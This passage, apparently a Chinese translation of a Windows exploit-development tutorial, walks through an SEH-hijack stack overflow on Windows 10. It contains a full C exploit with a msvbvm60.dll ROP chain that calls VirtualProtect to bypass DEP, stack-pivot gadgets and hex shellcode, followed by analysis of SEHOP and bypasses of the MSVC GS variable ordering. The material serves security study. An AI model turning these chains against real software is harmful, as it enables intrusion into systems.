// 0x40 -&gt; EDX | VirtualProtect() | Param #3 | flNewProtect | PAGE_EXECUTE_READWRITE&quot;\\xf2\\x1f\\x00\\x66&quot; // 0x66001ff2 | Gadget #8 | POP ECX; RET&quot;\\x00\\xa0\\x10\\x66&quot; // 0x6610A000 -&gt; ECX | VirtualProtect() | Param #4 | lpflOldProtect&quot;\\x5b\\x57\\x00\\x66&quot; // 0x6600575b | Gadget #9 | POP EDI; RET&quot;\\xf9\\x28\\x0f\\x66&quot; // 0x660F28F9 -&gt; EDI |&quot;\\x54\\x12\\x05\\x66&quot; // 0x66051254 | Gadget #10 | PUSHAD; RET// 0x660F28F9 | Gadget #11 | ROPNOP | returns into VirtualProtect// 0x6601CBEA | Gadget #12 | PUSH ESP; RET | return address from VirtualProtect 执行任意代码构建了ROP链，也搞定了劫持EIP的方法，现在剩下的唯一任务就是构建exploit。为此，我们必须了解当伪造的SEH handler收到程序的控制权时栈的布局情况。理想情况下，我们当然希望ESP直接指向ROP链的顶部，并结合EIP重定向，使其指向链中的第一个gadget。在实践中，这是不可能的。让我们回顾一下栈喷射代码，并在在伪造的handler的开始处设置一个断点，以观察发生溢出和EIP劫持后栈的状态。 在右边的突出显示的区域，我们可以看到栈的底部位于0x010FF3C0处。然而，您可能会注意到，栈中的值都不是我们溢出的内容——大家可能还记得，在发生访问冲突之前，我们在不断向栈中喷射伪造的SEH handler的地址。在左边突出显示的区域，我们可以看到，我们的溢出内容起始于0x010FFA0C附近。因此，在异常发生后，NTDLL.DLL让ESP向我们用溢出内容覆盖的栈区域下方偏移了0x64C字节（记住，栈是向下生长的，而不是向上生长的）。有了这些信息，就不难理解发生了什么。当NTDLL.DLL处理异常时，它开始使用异常发生时ESP下方的栈区域，而这个区域是我们鞭长莫及的，因此，也就无法写入我们的ROP链。 因此，这就产生了一个有趣的问题。也就是说，要想执行ROP链，我们需要让伪造的SEH handler设法让ESP（栈顶指针）重新指向由溢出内容覆盖的栈区域。当我们的断点被击中时，检查ESP的值，我们可以在0x010FF3C0处看到一个返回NTDLL.DLL的地址（无用），其后是另一个位于我们所能控制的栈范围（0x010FF4C4）下方的地址（也无用），它位于0x010FF3C4处。然而，0x010FF3C8处的第三个值0x010FF3A74直接落在从0x010FFA0C开始的受控区域的地址范围内，其偏移值为0x64。重新审视异常处理程序的原型，就会发现这第三个值（代表传递给处理程序的第二个参数）对应的是Windows传递给SEH handler的“已建帧”的指针。 1EXCEPTION_DISPOSITION __cdecl SehHandler(EXCEPTION_RECORD* pExceptionRecord, void* pEstablisherFrame, CONTEXT* pContextRecord, void* pDispatcherContext) 在我们的调试器中，检查栈中0x010FF3A74这个地址处的内容，我们可以更进一步地了解这个参数（也称为NSEH）的指向。 果然，我们可以看到，这个地址指向我们的溢出所控制的栈的一个区域（现在该区域已经被喷入的handler地址填满了）。具体来说，它直接指向前面提到的EXCEPTION_REGISTRATION_RECORD结构体的开始位置，而我们早就覆盖了这个结构体并用它来劫持EIP。在理想情况下，我们伪造的SEH handler会将ESP设置为[ESP + 8]，并且我们会将ROP链的开头部分放在被我们的溢出内容覆盖的EXCEPTION_REGISTRATION_RECORD结构体的开始处。对于这种类型的栈pivot，一个理想的gadget是POP REG;POP REG;POP ESP;RET或这种逻辑的一些变体，然而，msvbvm60.dll中并没有这种gadget，我不得不设法设计一个不同的解决方案。如前所述，当NTDLL将EIP重定向到我们伪造的SEH handler时，ESP在栈上的偏移量0x64C已经超出了我们用溢出控制的区域（具体来说，跑到该区域的下方了）。因此，对于栈pivot的这个问题，一个不太优雅的解决方案就是直接给ESP加上一个大于或等于0x64C的值。Ropper提供了一个功能，可以提取潜在的栈pivot gadget： ADD ESP，0x1004 ; RET是一个略显混乱的gadget：它超出溢出开始处0x990个字节，但由于它是唯一一个值大于0x64C的ADD ESP，因此别无选择。这个栈pivot会让ESP从我们的溢出起始处超出0x990或0x98C个字节（当然，对于同一应用程序的不同实例以及Windows的不同版本来说，该值还能会有所变化）。这意味着我们需要在实际ROP链开始之前，用0x98C个垃圾字节和ROPNOP来填充溢出。 将这些知识整合到一段代码中： (为了避免引发本机反应，以下代码需要在虚拟机中运行) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267#include&lt;Windows.h&gt;#include &lt;cstdint&gt;#include&lt;tchar.h&gt;uint8_t Exploit[] =&quot;AAAAAAAAAAAAAAAA&quot; // 16 bytes for buffer length&quot;AAAA&quot; // Stack Cookie&quot;AAAA&quot; // EBP&quot;AAAA&quot; // Return address&quot;AAAA&quot; // Overflow() | Param #1 | pInputBuf&quot;AAAA&quot; // Overflow() | Param #2 | dwInputBufSize&quot;DDDD&quot; // EXECEPTION_REGISTRATION_RECORD.Next&quot;\\xf3\\x28\\x0f\\x66&quot;// EXECEPTION_REGISTRATION_RECORD.Handler | 0x660f28f3 | ADD ESP, 0x1004; RET&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;&quot;\\xf9\\x28\\x0f\\x66&quot; // 0x660F28F9 | ROPNOP// ROP chain begins// EAX = NOP sled// ECX = Old protection (writable address)// EDX = PAGE_EXECUTE_READWRITE// EBX = Size// EBP = VirtualProtect return address (JMP ESP)// ESI = KERNEL32.DLL!VirtualProtect// EDI = ROPNOP&quot;\\x54\\x1e\\x00\\x66&quot; // 0x66001e54 | Gadget #1 | POP ESI ; RET&quot;\\xd0\\x10\\x00\\x66&quot; // 0x660010d0 -&gt; ESI | &lt;msvbvm60.dll!VirtualProtect thunk&gt;&quot;\\xfc\\x50\\x05\\x66&quot; // 0x660550fc | Gadget #2 | MOV EAX, DWORD [ESI] ; POP ESI; RET&quot;\\xef\\xbe\\xad\\xde&quot; // Junk&quot;\\xf8\\x9f\\x0f\\x66&quot; // 0x660f9ff8 | Gadget #3 | XCHG EAX, ESI; RET&quot;\\x1f\\x98\\x0e\\x66&quot; // 0x660e981f | Gadget #4 | POP EAX; RET&quot;\\x90\\x90\\x90\\x90&quot; // NOP sled -&gt; EAX | JMP ESP will point here&quot;\\xf0\\x1d\\x00\\x66&quot; // 0x66001df0 | Gadget #5 | POP EBP; RET&quot;\\xea\\xcb\\x01\\x66&quot; // 0x6601CBEA -&gt; EBP |&quot;\\x10\\x1f\\x00\\x66&quot; // 0x66001f10 | Gadget #6 | POP EBX; RET&quot;\\x00\\x20\\x00\\x00&quot; // 0x2000 -&gt; EBX | VirtualProtect() | Param #2 | dwSize&quot;\\x21\\x44\\x06\\x66&quot; // 0x66064421 | Gadget #7 | POP EDX; RET&quot;\\x40\\x00\\x00\\x00&quot; // 0x40 -&gt; EDX | VirtualProtect() | Param #3 | flNewProtect | PAGE_EXECUTE_READWRITE&quot;\\xf2\\x1f\\x00\\x66&quot; // 0x66001ff2 | Gadget #8 | POP ECX; RET&quot;\\x00\\xa0\\x10\\x66&quot; // 0x6610A000 -&gt; ECX | VirtualProtect() | Param #4 | lpflOldProtect&quot;\\x5b\\x57\\x00\\x66&quot; // 0x6600575b | Gadget #9 | POP EDI; RET&quot;\\xf9\\x28\\x0f\\x66&quot; // 0x660F28F9 -&gt; EDI |&quot;\\x54\\x12\\x05\\x66&quot; // 0x66051254 | Gadget #10 | PUSHAD; RET// 0x660F28F9 | Gadget #11 | ROPNOP | returns into VirtualProtect// 0x6601CBEA | Gadget #12 | PUSH ESP; RET | return address from VirtualProtect// Shellcode&quot;\\x55\\x89\\xe5\\x68\\x88\\x4e\\x0d\\x00\\xe8\\x53\\x00\\x00\\x00\\x68\\x86\\x57&quot;&quot;\\x0d\\x00\\x50\\xe8\\x94\\x00\\x00\\x00\\x68\\x33\\x32\\x00\\x00\\x68\\x55\\x73&quot;&quot;\\x65\\x72\\x54\\xff\\xd0\\x68\\x1a\\xb8\\x06\\x00\\x50\\xe8\\x7c\\x00\\x00\\x00&quot;&quot;\\x6a\\x64\\x68\\x70\\x77\\x6e\\x65\\x89\\xe1\\x68\\x6e\\x65\\x74\\x00\\x68\\x6f&quot;&quot;\\x72\\x72\\x2e\\x68\\x65\\x73\\x74\\x2d\\x68\\x66\\x6f\\x72\\x72\\x68\\x77\\x77&quot;&quot;\\x77\\x2e\\x89\\xe2\\x6a\\x00\\x52\\x51\\x6a\\x00\\xff\\xd0\\x89\\xec\\x5d\\xc3&quot;&quot;\\x55\\x89\\xe5\\x57\\x56\\xbe\\x30\\x00\\x00\\x00\\x64\\xad\\x8b\\x40\\x0c\\x8b&quot;&quot;\\x78\\x18\\x89\\xfe\\x31\\xc0\\xeb\\x04\\x39\\xf7\\x74\\x28\\x85\\xf6\\x74\\x24&quot;&quot;\\x8d\\x5e\\x24\\x85\\xdb\\x74\\x14\\x8b\\x4b\\x04\\x85\\xc9\\x74\\x0d\\x6a\\x01&quot;&quot;\\x51\\xe8\\x5d\\x01\\x00\\x00\\x3b\\x45\\x08\\x74\\x06\\x31\\xc0\\x8b\\x36\\xeb&quot;&quot;\\xd7\\x8b\\x46\\x10\\x5e\\x5f\\x89\\xec\\x5d\\xc2\\x04\\x00\\x55\\x89\\xe5\\x81&quot;&quot;\\xec\\x30\\x02\\x00\\x00\\x8b\\x45\\x08\\x89\\x45\\xf8\\x8b\\x55\\xf8\\x03\\x42&quot;&quot; \\x83\\xc0\\x04\\x89\\x45\\xf0\\x83\\xc0\\x14\\x89\\x45\\xf4\\x89\\xc2\\x8b&quot;&quot;\\x45\\x08\\x03\\x42\\x60\\x8b\\x4a\\x64\\x89\\x4d\\xd0\\x89\\x45\\xfc\\x89\\xc2&quot;&quot;\\x8b\\x45\\x08\\x03\\x42\\x20\\x89\\x45\\xec\\x8b\\x55\\xfc\\x8b\\x45\\x08\\x03&quot;&quot;\\x42\\x24\\x89\\x45\\xe4\\x8b\\x55\\xfc\\x8b\\x45\\x08\\x03\\x42\\x1c\\x89\\x45&quot;&quot;\\xe8\\x31\\xc0\\x89\\x45\\xe0\\x89\\x45\\xd8\\x8b\\x45\\xfc\\x8b\\x40\\x18\\x3b&quot;&quot;\\x45\\xe0\\x0f\\x86\\xd2\\x00\\x00\\x00\\x8b\\x45\\xe0\\x8d\\x0c\\x85\\x00\\x00&quot;&quot;\\x00\\x00\\x8b\\x55\\xec\\x8b\\x45\\x08\\x03\\x04\\x11\\x89\\x45\\xd4\\x6a\\x00&quot;&quot;\\x50\\xe8\\xbd\\x00\\x00\\x00\\x3b\\x45\\x0c\\x0f\\x85\\xa1\\x00\\x00\\x00\\x8b&quot;&quot;\\x45\\xe0\\x8d\\x14\\x00\\x8b\\x45\\xe4\\x0f\\xb7\\x04\\x02\\x8d\\x0c\\x85\\x00&quot;&quot;\\x00\\x00\\x00\\x8b\\x55\\xe8\\x8b\\x45\\x08\\x03\\x04\\x11\\x89\\x45\\xd8\\x8b&quot;&quot;\\x4d\\xfc\\x89\\xca\\x03\\x55\\xd0\\x39\\xc8\\x7c\\x7f\\x39\\xd0\\x7d\\x7b\\xc7&quot;&quot;\\x45\\xd8\\x00\\x00\\x00\\x00\\x31\\xc9\\x8d\\x9d\\xd0\\xfd\\xff\\xff\\x8a\\x14&quot;&quot;\\x08\\x80\\xfa\\x00\\x74\\x20\\x80\\xfa\\x2e\\x75\\x15\\xc7\\x03\\x2e\\x64\\x6c&quot;&quot;\\x6c\\x83\\xc3\\x04\\xc6\\x03\\x00\\x8d\\x9d\\xd0\\xfe\\xff\\xff\\x41\\xeb\\xde&quot;&quot;\\x88\\x13\\x41\\x43\\xeb\\xd8\\xc6\\x03\\x00\\x8d\\x9d\\xd0\\xfd\\xff\\xff\\x6a&quot;&quot;\\x00\\x53\\xe8 \\x00\\x00\\x00\\x50\\xe8\\xa3\\xfe\\xff\\xff\\x85\\xc0\\x74&quot;&quot;\\x29\\x89\\x45\\xdc\\x6a\\x00\\x8d\\x95\\xd0\\xfe\\xff\\xff\\x52\\xe8\\x21\\x00&quot;&quot;\\x00\\x00\\x50\\xff\\x75\\xdc\\xe8\\xd1\\xfe\\xff\\xff\\x89\\x45\\xd8\\xeb\\x0a&quot;&quot;\\x8d\\x45\\xe0\\xff\\x00\\xe9\\x1f\\xff\\xff\\xff\\x8b\\x45\\xd8\\x89\\xec\\x5d&quot;&quot;\\xc2\\x08\\x00\\x55\\x89\\xe5\\x57\\x8b\\x4d\\x08\\x8b\\x7d\\x0c\\x31\\xdb\\x80&quot;&quot;\\x39\\x00\\x74\\x14\\x0f\\xb6\\x01\\x0c\\x60\\x0f\\xb6\\xd0\\x01\\xd3\\xd1\\xe3&quot;&quot;\\x41\\x85\\xff\\x74\\xea\\x41\\xeb\\xe7\\x89\\xd8\\x5f\\x89\\xec\\x5d\\xc2\\x08&quot;&quot;\\x00&quot;;void Overflow(uint8_t* pInputBuf, uint32_t dwInputBufSize) &#123; char Buf[16] = &#123; 0 &#125;; memcpy(Buf, pInputBuf, dwInputBufSize);&#125;int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) &#123; char Junk[0x5000] = &#123; 0 &#125;; // Move ESP lower to ensure the exploit data can be accomodated in the overflow HMODULE hModule = LoadLibraryW(L&quot;msvbvm60.dll&quot;); __asm &#123; Push0xdeadc0de// Address of handler function PushFS : [0]// Address of previous handler Mov FS : [0] , Esp// Install new EXECEPTION_REGISTRATION_RECORD &#125; _tprintf(_T(&quot;... loaded non-ASLR/non-SafeSEH module msvbvm60.dll to 0x%p\\r\\n&quot;), hModule); _tprintf(_T(&quot;... passing %d bytes of data to vulnerable function\\r\\n&quot;), sizeof(Exploit) - 1); Overflow(Exploit, 0x20000); return 0;&#125; 上面的代码中有几个细节值得注意。首先，您可能注意到，我通过将垃圾异常处理程序（0xdeadc0de）链接到TEB(FS[0])中的处理程序列表，显式注册了该处理程序。之所以这样做，是因为我发现在栈顶部覆盖NTDLL.DLL注册的默认处理程序的做法不太可靠。这是因为有时栈的顶端没有足够的空间来容纳shellcode，这会触发VirtualProtect的STATUS_CONFICTING_ADDRESS错误（代码0xc0000015）。 图20中另一个值得注意的细节是，我在ROP链末端的溢出内容中加入了自己的shellcode。这是我编写的一个自定义的shellcode（源代码可以从Github上下载），它在ROP链化后的栈上被执行后会弹出一个消息框。 编译完含有溢出漏洞程序后，我们可以进行单步跟踪，看看溢出数据是如何结合在一起来执行shellcode的。 (上面那段代码的内联汇编语法有错误，不知道是他写的有问题还是我的设置问题，报错信息为C2400 “操作码”中的内联汇编语法错误；找到“[”，所以下面都是别人的图) 在漏洞程序发生栈溢出之前的状态 在第一个断点处，我们可以看到，栈上的目标EXCEPTION_REGISTRATION_RECORD位于0x00B9ABC8处。在发生溢出之后，我们可以期待该handler字段将被我们伪造的SEH handler的地址所覆盖。 memcpy对栈末端之外执行写入操作是抛出的访问违例异常（Access violation exception） 在memcpy函数中，由于rep MOVSB指令试图将数据写入栈的末端之外的内存时，发生了访问违例异常。在0x00B9ABCC处，我们可以看到EXCEPTION_REGISTRATION_RECORD结构体的handler字段已经被我们msvbvm60.dll中的栈pivot gadget的地址所覆盖。 伪造的SEH handler让ESP跳回由溢出控制的地区 在栈中向上跳过0x1004字节，我们可以看到在突出显示区域，ESP现在指向我们ROP链的开始地址。这个ROP链将填充所有相关寄存器的值，以便为PUSHAD gadget做好相应的准备，之后，该gadget将把这些值移到栈上，从而为调用KERNEL32.DLL!VirtualProtect做好准备。 PUSHAD为绕过DEP准备好相应的调用栈 在PUSHAD指令执行后，我们可以看到ESP现在指向msvbvm60.dll中的ROPN，其后紧跟KERNEL32.DLL中VirtualProtect的地址。在0x00B9B594处，我们可以看到传递给VirtualProtect的第一个参数，就是我们栈上0x00B9B5A4处的shellcode的地址（该地址在上图中已经突出显示）。 ROP链的最后一个gadget将EIP设置为ESP 一旦VirtualProtect返回，ROP链中的最后一个gadget就会将EIP重定向到ESP的值，这样，ESP将指向我们直接存储在ROP链之后的shellcode的起始位置。您可能已经注意到，shellcode的前4个字节实际上就是ROP链通过PUSHAD指令动态生成的NOP指令，而不是通过溢出写入的shellcode的起始位置。 弹出消息框的shellcode在栈上成功执行，从而完成了漏洞的利用过程 SEHOP实际上，在Windows中还有一种更为强大的SEH劫持缓解机制，称为SEH覆写保护（SEH Overwrite Protection，SEHOP），它可以抗衡这里描述的方法。引入SEHOP的目的，是为了既可以检测EXCEPTION_REGISTRATION_RECORD损坏，又无需重新编译应用程序或依靠每个模块的漏洞利用缓解方案，如SafeSEH。为此，SEHOP将在SEH链的底部引入一个额外的链接，并在异常发生时通过检查是否可以通过遍历SEH链而到达该链接，来实现SEH劫持的防御机制。由于EXCEPTION_REGISTRATION_RECORD的NSEH字段存储在handler字段之前，因此，在通过栈溢出破坏现有的SEH handler时，必然会破坏NSEH，以及破坏整个链（原理上类似于栈金丝雀（stack canary），其中金丝雀就是NSEH字段本身）。SEHOP是在Windows Vista SP1（在默认情况下禁用）和Windows Server 2008（在默认情况下启用）中引入的，在过去的十年中，SEHOP一直处于这种半启用状态（在工作站上禁用，在服务器上启用）。值得注意的是，最近随着Windows 10 v1709的发布，这种情况已经发生了变化：SEHOP已经成为默认启用的漏洞缓解功能了。 这似乎与上一节在Windows 10虚拟机上探讨的SEH劫持溢出情况相矛盾。为什么SEHOP没有能够在exploit的初始阶段阻止EIP重定向到栈pivot？虽然我们还不是十分清楚，然而这似乎是微软方面配置错误的问题。当我对之前探索溢出所用EXE程序单独进行设置，并手动点选“Override system settings”框后，SEHOP机制就开始发挥威力：栈pivot将无法执行。令人费解的是，在默认情况下，系统已经在该进程上启用了SEHOP机制。 下图为某exe文件，没有手动勾选。 这有可能是微软方面有意的配置，只是在上面的截图中被曲解了。由于SEHOP与第三方应用程序（如Skype和Cygwin）不兼容，因此，SEHOP在历史上一直被广泛禁用（微软在这里讨论了这个问题）。当SEHOP与本文中讨论的其他漏洞缓解措施一起正确启用时，在没有链式内存泄漏（任意读取）或任意写入原语的情况下，SEH劫持将无法用于利用栈溢出漏洞。任意读取原语可以允许NSEH字段在溢出前被泄漏，这样就可以制作溢出数据，以便在EIP劫持期间不破坏SEH链。通过任意写入原语（在下一节讨论），攻击者可以覆盖存储在栈上的返回地址或SEH handler，而不会破坏NSEH或栈金丝雀的值，从而绕过SEHOP和栈Cookie缓解措施。 任意写入&amp;局部变量破坏在某些情况下，攻击者根本就不需要溢出函数栈帧的末尾来触发EIP重定向。如果他们可以在不需要覆盖栈Cookie的情况下成功地获得代码执行权限，那么栈Cookie验证检查就可以轻松绕过。为此，有一种方法是使用栈溢出来破坏函数中的局部变量，以便让应用程序将我们选择的值写入我们选择的地址。下面的示例函数包含可以用这种方式利用的逻辑。 12345678uint32_t gdwGlobalVar = 0; void Overflow（uint8_t* pInputBuf， uint32_t dwInputBufSize) &#123; char Buf[16]; uint32_t dwVar1 = 1; uint32_t* pdwVar2 = &amp;gdwGlobalVar; memcpy（Buf， pInputBuf， dwInputBufSize); *pdwVar2 = dwVar1; &#125; 从根本上讲，我们要利用的是一个非常简单的代码模式： 函数必须包含一个容易发生栈溢出的数组或结构。 该函数必须包含至少两个局部变量：一个解引用的指针和一个用于写入该指针的值。 函数必须使用局部变量写入解引用的指针，并在栈溢出发生后执行这个操作。 函数必须以这样的方式进行编译：即溢出的数组在栈上存储的位置比局部变量低。 最后一点是一个值得进一步研究的问题。我们希望MSVC（Visual Studio 2019使用的编译器）以这样的方式编译图29中的代码：Buf的16个字节被放在分配给栈帧内存的最低区域（当包含栈Cookie时，应该是总共28个字节），然后是最高区域的dwVar1和pdwVar2。这个顺序与源代码中声明这些变量的顺序是一致的；这允许Buf向前溢出到更高的内存中，并用我们选择的值覆盖dwVar1和pdwVar2的值，从而使我们用于覆盖dwVar1的值被放在我们选择的内存地址上。然而在现实中，情况并非如此，编译器给出的汇编代码如下所示： 12345678910111213141516171819202122232425push ebp mov ebp,esp sub esp,1C mov eax,dword ptr ds:[&lt;___security_cookie&gt;] xor eax,ebp mov dword ptr ss:[ebp-4],eax mov dword ptr ss:[ebp-1C],1 mov dword ptr ss:[ebp-18], mov ecx,dword ptr ss:[ebp+C] push ecx mov edx,dword ptr ss:[ebp+8] push edx lea eax,dword ptr ss:[ebp-14] push eax call add esp,C mov ecx,dword ptr ss:[ebp-18] mov edx,dword ptr ss:[ebp-1C] mov dword ptr ds:[ecx],edx mov ecx,dword ptr ss:[ebp-4] xor ecx,ebp call &lt;preciseoverwrite.@__security_check_cookie@4&gt; mov esp,ebp pop ebp ret 从上面的反汇编代码中我们可以看到，编译器已经在EBP-0x4和EBP-0x14之间的最高内存部分中选择了一个对应于Buf的区域，并且已经在EBP-0x1C和EBP-0x18的最低内存部分中分别为dwVar1和pdwVar2选择了一个区域。这种排序使易受攻击的函数免受局部变量通过栈溢出而损坏的影响。也许最有趣的是，dwVar1和pdwVar2的排序与它们在源代码中相对于Buf的声明顺序相矛盾。这最初让我觉得很不解，因为我认为MSVC会根据变量的声明顺序来排序，但进一步的测试证明事实并非如此。实际上，进一步的测试证明，MSVC并不是根据变量的声明、类型或名称的顺序来排序，而是根据它们在源代码中被引用（使用）次数来排序：引用次数多的变量将优先于那些引用次数少的变量。 123456789101112void Test() &#123; uint32_t A; uint32_t B; uint32_t C; uint32_t D; B = 2; A = 1; D = 4; C = 3; C++; &#125; 因此，我们可以预期这个函数的编译会按以下方式排列变量：C、B、A、D。这符合变量引用(使用)次数的顺序，而不是它们被声明的顺序。其中，C将被放在第一位(内存中最高地址处，距离EBP的偏移量最小)，因为它被引用了两次，而其他变量都只被引用了一次。 12345678910111213push ebp mov ebp,esp sub esp,10 mov dword ptr ss:[ebp-8],2 mov dword ptr ss:[ebp-C],1 mov dword ptr ss:[ebp-10],4 mov dword ptr ss:[ebp-4],3 mov eax,dword ptr ss:[ebp-4] add eax,1 mov dword ptr ss:[ebp-4],eax mov esp,ebp pop ebp ret 果然，我们可以看到，变量都已经按照我们预测的顺序排列，其中，C位于EBP – 4处，也就是排在第一位。尽管如此，MSVC使用的排序逻辑与我们在图30中看到的情况相矛盾。毕竟，dwVar1和pdwVar2的引用次数（各两次）都比Buf高（在memcpy中只有一次），而且都是在Buf之前引用的。那么这是怎么回事呢？GS包含了一个额外的安全缓解功能，它试图安全地对局部变量进行排序，以防止由于栈溢出而导致可利用的局部变量破坏。 在GS机制下生成的具有安全变量顺序栈布局 绕过在项目设置中禁用GS，会产生以下代码： 12345678910111213141516171819push ebp mov ebp,esp sub esp,18 mov dword ptr ss:[ebp-8],1 mov dword ptr ss:[ebp-4], mov eax,dword ptr ss:[ebp+C] push eax mov ecx,dword ptr ss:[ebp+8] push ecx lea edx,dword ptr ss:[ebp-18] push edx call add esp,C mov eax,dword ptr ss:[ebp-4] mov ecx,dword ptr ss:[ebp-8] mov dword ptr ds:[eax],ecx mov esp,ebp pop ebp ret 仔细对比上图34中的汇编代码和图30中的原始（安全）汇编代码，大家就会发现，从这个函数中删除的可不仅仅是栈Cookie检查。事实上，MSVC已经完全重新排列了栈上的变量，使其与正常规则一致，因此将Buf数组放在了内存的最低区域（EBP – 0x18）。因此，这个函数现在很容易通过栈溢出导致局部变量损坏。 在用多种不同的变量类型（包括其他数组类型）测试了同样的逻辑后，我得出如下结论：MSVC对数组和结构体（GS缓冲区）有一个特殊的规则，即总是将它们放在内存的最高区域，以防止编译后的函数的局部变量因栈溢出而遭到破坏。了解到这些信息后，我开始尝试评估这个安全机制的复杂程度，并设法通过边缘案例（edge cases）来绕过它。我发现了多个，下面是我认为最显著的例子。 首先，让我们来看看如果memcpy被移除会发生什么情况。 1234567void Overflow() &#123; uint8_t Buf[16] = &#123; 0 &#125;; uint32_t dwVar1 = 1; uint32_t* pdwVar2 = &amp;gdwGlobalVar; *pdwVar2 = dwVar1; &#125; 我们希望MSVC的安全排序规则总是将数组放置在内存的最高区域，以为函数提供安全保护，然而汇编代码表明，事情并非如此。 12345678910111213141516push ebp mov ebp,esp sub esp,18 xor eax,eax mov dword ptr ss:[ebp-18],eax mov dword ptr ss:[ebp-14],eax mov dword ptr ss:[ebp-10],eax mov dword ptr ss:[ebp-C],eax mov dword ptr ss:[ebp-8],1 mov dword ptr ss:[ebp-4], 